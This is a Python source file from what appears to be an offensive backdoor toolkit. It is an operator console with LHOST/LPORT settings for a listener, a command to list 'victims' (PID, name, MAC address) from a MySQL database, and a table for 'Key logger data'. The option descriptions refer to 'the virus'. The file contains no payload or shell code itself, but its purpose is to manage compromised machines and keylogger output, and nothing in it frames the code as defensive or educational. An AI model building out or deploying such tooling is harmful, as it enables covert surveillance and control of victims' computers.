
from libs.colors import COLORS
from subprocess import check_output, CalledProcessError, call
from os import devnull
from terminaltables import AsciiTable
from mysql.connector import connect
from socket import socket, AF_INET, SOCK_DGRAM


devnull = open(devnull, 'w')
colors = COLORS()

global program_path
global activated_option


def print_backdoor_listener_options(inputs_dict):
    descriptions = {
        'LPORT':'This is the name of the final executable',
        'LHOST': 'This is the program ID of the virus',
        'PID': 'Number of seconds it sleeps during work'
    }

    print(colors.RESET, end='')
    table_data = [[f'{colors.BOLD}Option', f'{colors.BOLD}Current Setting', f'{colors.BOLD}Description{colors.RESET}']]
    for item in inputs_dict:
        try:
            single_data = [str(item), str(inputs_dict[item]), descriptions[item]]
            table_data.append(single_data)
        except KeyError:
            pass
        
    table = AsciiTable(table_data)
    print(table.table, end='\n\n')


def update_setting(setting, new_value, save_values):
    save_values[setting] = new_value
    return save_values


def read_credential_file(program_path):
    credentials = {}
    with open(program_path + '/data/database_credentials.txt', 'r') as credential_file:
        while True:
            content_line = credential_file.readline()
            if not content_line:
                break

            if content_line[-1] == '\n':
                content_line = content_line[:-1]

            if len(content_line) > 0:
                key, content = content_line.split('=')
                credentials[key] = content

    return credentials


def show_victim_data():
    global program_path

    try:
        credentials = read_credential_file(program_path)
        sql_database = connect(
            host     = credentials['Server'],
            user     = credentials['Username'],
            passwd   = credentials['Password'],
            database = credentials['Database'],
            port     = credentials['Port']
        )

        my_cursor = sql_database.cursor()
        command = 'SELECT * FROM `users`'
        my_cursor.execute(command)
        
        data = list(map(list,my_cursor.fetchall()))

        header = [[colors.BOLD + 'PID', 'Name', 'MAC address', 'Selected' + colors.RESET]]

        table = AsciiTable(header + data)
        print(table.table)

        print(colors.RESET, end='\n\n')
        


    except Exception as error:
        print(colors.Red + '[✘]Error occured during the proccess')
        print('[✘]{}'.format(error) + colors.RESET)


def draw_table(heading, data):
    print('\n\n' + colors.BOLD + colors.ULINE + "Report of Key logger data" + colors.RESET)

    real_data = [heading]
    real_data.extend(data)

    table = AsciiTable(real_data)
    print(table.table)


def activate_listener():
    # from the begining used command line interface
    global activated_option

    s = socket(AF_INET, SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    private_ip = s.getsockname()[0]
    s.close()


    saved_inputs_dict = {
        'LPORT':'4343',
        'LHOST': private_ip,
        'PID': '1'
    }

    while True:
        # get the command from the user
        command = input("".join(activated_option) + ' > ')

        if command == 'show victims':
            show_victim_data()

        elif command == 'clear':
            call('clear', shell=True)

        elif command == 'exit' or command == 'quit':
            activated_option.remove(' {}listen({}Backdoor{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            break

        elif command == 'help':
            logo_printer.print_help()

        elif command == '' or command == ' ':
            pass

        # if the command is show options then show options
        elif command == 'show options' or command == 'options':
            print_backdoor_listener_options(saved_inputs_dict)

        # if the command is set then update the settings wales
        elif command.split()[0] == 'set':
            setting = command.split()[1]
            new_value = command.split()[2]
            saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)

        else:
            print(colors.Red + '[✘]Invalid comand' + colors.RESET)


activate_listener()